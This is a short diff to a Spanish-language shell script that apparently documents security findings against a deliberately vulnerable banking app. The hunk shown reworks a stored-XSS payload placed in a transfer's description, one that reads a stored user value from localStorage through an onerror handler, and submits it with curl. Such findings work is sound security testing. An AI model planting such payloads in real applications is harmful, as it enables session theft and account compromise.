@@ -61,7 +61,8 @@ TOKEN_CARLOS=$(login carlos_mora "$PASS_CARLOS" | sed -n 's/.*"token":"\([^"]*\)
 {
   echo "# HALLAZGO-03 - Stored XSS en concepto de transferencia"
   echo "Fecha de ejecucion: $(date '+%Y-%m-%d %H:%M:%S')"
-  PAYLOAD='Pago de Servicios <img src=\"x\" onerror=\"alert(localStorage.getItem(\\u0027insecure_pay_user\\u0027))\">'
+  # Acceso por propiedad (sin comillas) para que el JavaScript sea valido dentro del atributo onerror
+  PAYLOAD='Pago de Servicios <img src=\"x\" onerror=\"alert(localStorage.insecure_pay_user)\">'
   seccion "Transferencia legitima de Carlos (cuenta 2) con payload XSS en el concepto" \
     "curl -i -X POST $API/api/transacciones/transferir -H \"Authorization: Bearer <TOKEN_CARLOS>\" -H \"Content-Type: application/json\" -d '{\"cuentaOrigenId\":2,\"numeroCuentaDestino\":\"CR05015202001026458902\",\"monto\":1000,\"conceptoHtml\":\"$PAYLOAD\"}'"
   curl -s -i -X POST "$API/api/transacciones/transferir" \
